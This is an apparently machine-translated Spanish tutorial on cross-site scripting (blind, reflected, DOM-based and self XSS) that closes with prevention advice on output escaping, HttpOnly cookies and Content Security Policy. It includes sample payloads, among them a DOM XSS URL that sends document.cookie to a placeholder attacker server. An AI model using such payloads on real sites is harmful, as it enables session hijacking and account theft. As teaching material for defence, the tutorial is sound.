#Blind XSS
Las vulnerabilidades ciegas de XSS son vulnerabilidades XSS almacenadas cuya entrada maliciosa
es almacenado por el servidor y ejecutado en otra parte de la aplicación o en otra aplicación que no puede ver.
Por ejemplo, supongamos que una página en example.com le permite enviar un
mensaje al personal de soporte del sitio. Cuando un usuario envía un mensaje, eso Secuencias de comandos entre sitios
La entrada no se valida o desinfecta de ninguna manera antes de que se procese en el
la página de administración del sitio. Un atacante puede enviar un mensaje con código JavaScript.
y hacer que ese código lo ejecute cualquier administrador que vea ese mensaje.
Estos defectos XSS son más difíciles de detectar, ya que no puede encontrarlos
buscando información reflejada en la respuesta del servidor, pero pueden ser tan
peligrosas como vulnerabilidades XSS almacenadas habitualmente. A menudo, XSS ciego puede ser
utilizado para atacar a los administradores, exfiltrar sus datos y comprometer sus
cuentas.

#XSS reflejado
Las vulnerabilidades reflejadas de XSS ocurren cuando la entrada del usuario se devuelve al usuario
sin almacenarse en una base de datos. La aplicación toma la entrada del usuario, la procesa en el lado del servidor y la devuelve inmediatamente al usuario.
El primer ejemplo que mostré, con el formulario de correo electrónico, involucró un Ataque XSS. Estos problemas a menudo ocurren cuando el servidor depende
de la entrada del usuario.para construir páginas que muestren resultados de búsqueda o mensajes de error. Por ejemplo, digamos que un sitio tiene una función de búsqueda.
El usuario puede ingresar un término de búsqueda a través de un parámetro de URL, y la página mostrará un mensaje que contiene el término
en la parte superior de la página de resultados. Si un usuario busca abc, el código fuente del
El mensaje relacionado podría verse así:
<h2> Ha buscado abc; aquí están los resultados </h2>
Si la función de búsqueda muestra cualquier cadena de búsqueda enviada por el usuario en
la página de resultados, un término de búsqueda como el siguiente haría que una secuencia de comandos
incrustado en la página de resultados y ejecutado por el navegador:
https://example.com/search?q=<script>alert('XSS by Vickie '); </script>
Si un atacante puede engañar a las víctimas para que visiten esta URL, la carga útil
se incrustan en su versión de la página, lo que hace que el navegador de la víctima
ejecute cualquier código que le guste al atacante. A diferencia de XSS almacenado, que permite
atacantes para ejecutar código en cualquiera que acceda a sus recursos almacenados,
XSS reflejado permite a los atacantes ejecutar código en los navegadores de las víctimas
que hacen clic en sus enlaces maliciosos.

#XSS basado en DOM es similar al XSS reflejado, excepto que en XSS basado en DOM,
la entrada del usuario nunca sale del navegador del usuario. En XSS basado en DOM, el La aplicación toma la entrada del usuario, la procesa en el navegador de la víctima y
luego se lo devuelve al usuario. El modelo de objetos de documento (DOM) es un modelo que los navegadores utilizan para representar una página web. El DOM representa
la estructura de una página web; define lo básico propiedades y comportamiento de cada elemento HTML, y ayuda a los scripts a acceder y 
modificar el contenido de la página. XSS basado en DOM se orienta a los DOM directamente: ataca la copia local del cliente de la página web en su lugar
de pasar por el servidor. una página toma datos proporcionados por el usuario y altera dinámicamente el DOM en función de
esa entrada. Las bibliotecas de JavaScript como jQuery son propensas a XSS basado en DOM
ya que alteran dinámicamente los elementos DOM.
 Como en XSS reflejado, los atacantes envían cargas útiles XSS basadas en DOM a través del
la entrada del usuario de la víctima. A diferencia de XSS reflejado, una secuencia de comandos XSS basada en DOM no
requieren la participación del servidor, porque se ejecuta cuando la entrada del usuario modifica
el código fuente de la página en el navegador directamente. El script XSS nunca es
enviado al servidor, por lo que la respuesta HTTP del servidor no cambiará.

Supongamos que un sitio web permite al usuario cambiar su configuración regional enviándolo a través de un parámetro de URL:
https://example.com?locale=north+america El código del lado del cliente de la página web utilizará esta configuración regional para 
construir un mensaje de bienvenida cuyo HTML se ve así: <h2> ¡Bienvenido, usuario de América del Norte! </h2>
El parámetro de URL no se envía al servidor. En cambio, se usa localmente, por el navegador del usuario, para construir una página web usando un lado del cliente
texto. Pero si el sitio web no valida el parámetro de configuración regional enviado por el usuario, un atacante puede engañar a los usuarios para que visiten una URL como esta:
https://example.com?locale= <script> location = 'http: // attacker_server_ip /? c =' + document.cookie; </script>
El sitio incorporará la carga útil en la página web del usuario y la víctima El navegador ejecutará el script malicioso.
DOM XSS puede sonar mucho como XSS reflejado al principio. La diferencia es que la carga útil XSS reflejada se envía al servidor y se devuelve al
navegador del usuario dentro de una respuesta HTTP. Por otro lado, el DOM La carga útil XSS se inyecta en una página debido a la representación
del código del lado del cliente entrada del usuario de una manera insegura. Aunque los resultados de los dos ataques
son similares, los procesos de prueba y protección contra ellos son diferentes.
Los campos de entrada del usuario que pueden conducir a XSS reflejado y basado en DOM no siempre son parámetros de URL. A veces se muestran como fragmentos de URL.
o nombres de ruta. Los fragmentos de URL son cadenas, ubicadas al final de una URL, que comience con un carácter #. A menudo se utilizan para dirigir automáticamente a los usuarios a
una sección dentro de una página web o transferir información adicional. Por ejemplo, esta es una URL con un fragmento que lleva al usuario a la sección #about_us de
la página de inicio del sitio:https: //example.com#about_us
Hablaremos más sobre los componentes de una URL en el Capítulo 7. Para obtener información sobre DOM XSS y algunos ejemplos de cargas útiles, consulte PortSwigger
artículo "XSS basado en DOM" en https://portswigger.net/web-security/cross-site-scripting/
basado en dom


#SELF XSS
Los ataques Self-XSS requieren que las víctimas ingresen ellos mismos una carga útil maliciosa. Para realizarlos, los atacantes deben engañar a los usuarios para que hagan mucho más que simplemente
ver una página o navegar a una URL en particular.Por ejemplo, supongamos que un campo del panel de control de un usuario es vulnerable a
XSS almacenado. Pero dado que solo la víctima puede ver y editar el campo, no hay forma para que un atacante entregue la carga útil a menos que el atacante pueda de alguna manera
engañar a la víctima para que cambie el valor del campo en la carga útil XSS. Si alguna vez ha visto publicaciones en las redes sociales
o mensajes de texto que le dicen que pegue un fragmento de código en su navegador para "hacer algo genial", probablemente fue código de ataque destinad
o a engañarlo para que lance self-XSS contra usted mismo. Los atacantes a menudo incorporan una parte de la carga útil maliciosa (generalmente a través de una
URL como bitly.com para que las víctimas no sospechen nada) en un código de aspecto complicado y utilizan las redes sociales para engañar a los usuarios desprevenidos
atacándose a sí mismos.
En las recompensas de errores, los errores de auto-XSS generalmente no se aceptan como misiones secundarias válidas porque requieren ingeniería social. Errores que requieren redes sociales
La ingeniería o la manipulación de las víctimas no suelen aceptarse en errores.
programas de recompensas porque no son cuestiones puramente técnicas.

#PREVENIR
Para evitar XSS, una aplicación debe implementar dos controles: entrada robusta validación y escape de salida contextual y codificación. Aplicaciones
nunca debe insertar datos enviados por el usuario directamente en un documento HTML incluyendo, por ejemplo, etiquetas <script> internas, nombres de etiquetas 
HTML o nombres de atributos. En cambio, el servidor debe validar esa entrada enviada por el usuario no contiene caracteres peligrosos que puedan influir
en la forma en que los navegadores interpretar la información de la página. Por ejemplo, la entrada del usuario que contiene la cadena "<script>" es un buen
indicador de que la entrada contiene un XSS carga útil. En este caso, el servidor podría bloquear la solicitud o desinfectarla
eliminar o escapar de los caracteres especiales antes de continuar con el procesamiento

En el contexto de nuestro ejemplo, la aplicación necesita codificar especial caracteres en un formato utilizado por documentos HTML. Por ejemplo, la izquierda
y los corchetes en ángulo recto se pueden codificar en caracteres HTML & lt y & gt. Para evitar XSS, la aplicación debe escapar de los caracteres que tienen
que significa en HTML, como el carácter &, los corchetes angulares <y>, un solo y comillas dobles y el carácter de barra inclinada.Escapar garantiza que
los navegadores no malinterpreten estos caracteres como código para ejecutar. Esto es lo que hacen la mayoría de las aplicaciones modernas para prevenir XSS. La aplicación 
debe hacer esto para cada pieza de entrada del usuario que será procesado o accedido por el navegador de un usuario. Muchos marcos de JavaScript modernos como React, Angular 2+ y Vue.js hacen esto automáticamente por usted, por lo que
muchas vulnerabilidades XSS se pueden prevenir eligiendo el JavaScript correcto marco para usar

La prevención de XSS basado en DOM requiere un enfoque diferente. Ya que la entrada del usuario malintencionado no pasará por el servidor, desinfectando los datos
que entra y sale del servidor no funcionará. En cambio, las aplicaciones debe evitar el código que reescribe el documento HTML en función de la entrada del usuario,
y la aplicación debe implementar la validación de entrada del lado del cliente antes de que sea insertado en el DOM. También puede tomar medidas para mitigar
el impacto de las fallas XSS si suceda. Primero, puede configurar la marca HttpOnly en cookies sensibles que su sitio utiliza. Esto evita que los atacantes
roben esas cookies a través de XSS. También debe implementar la respuesta HTTP Content-Security-Policy encabezamiento. Este encabezado le permite 
restringir cómo recursos como JavaScript, CSS, o las imágenes se cargan en sus páginas web. Para evitar XSS, puede instruir al
navegador para ejecutar solo scripts de una lista de fuentes. Para más información sobre la prevención de ataques XSS, visite la hoja de trucos 
de prevención de OWASP XSS,

https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html.


Filter input on arrival: at the point where user input is received, filter as strictly as possible based on what is expected or valid input.
Encode data on output: at the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
Use appropriate response headers: to prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-- Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
Content Security Policy: as a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

